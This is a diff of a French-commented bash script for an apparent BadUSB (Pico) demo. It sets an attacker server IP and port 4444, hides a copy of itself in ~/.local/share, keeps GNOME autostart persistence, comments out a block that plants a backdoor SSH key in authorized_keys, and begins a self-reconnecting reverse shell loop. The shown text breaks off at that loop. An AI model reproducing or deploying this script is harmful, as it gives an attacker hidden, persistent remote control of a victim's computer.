@@ -1,5 +1,5 @@
 #!/bin/bash
-IP="192.168.1.50"        # IP de ton serveur
+IP="192.168.0.189"        # IP de ton serveur
 PORT="4444"
 SELF="$HOME/.local/share/.whelper.sh"
 
@@ -28,10 +28,10 @@ X-GNOME-Autostart-enabled=true
 EOF
 
 # 4) BONUS démo : clé SSH de secours (accès persistant sans le Pico)
-mkdir -p "$HOME/.ssh"
-grep -qF "demo-badusb" "$HOME/.ssh/authorized_keys" 2>/dev/null || \
-  echo 'ssh-ed25519 AAAA...TA_CLE demo-badusb' >> "$HOME/.ssh/authorized_keys"
-chmod 700 "$HOME/.ssh"; chmod 600 "$HOME/.ssh/authorized_keys"
+#mkdir -p "$HOME/.ssh"
+#grep -qF "demo-badusb" "$HOME/.ssh/authorized_keys" 2>/dev/null || \
+#  echo 'ssh-ed25519 AAAA...TA_CLE demo-badusb' >> "$HOME/.ssh/authorized_keys"
+#chmod 700 "$HOME/.ssh"; chmod 600 "$HOME/.ssh/authorized_keys"
 
 # 5) reverse shell avec reconnexion automatique
 while :; do
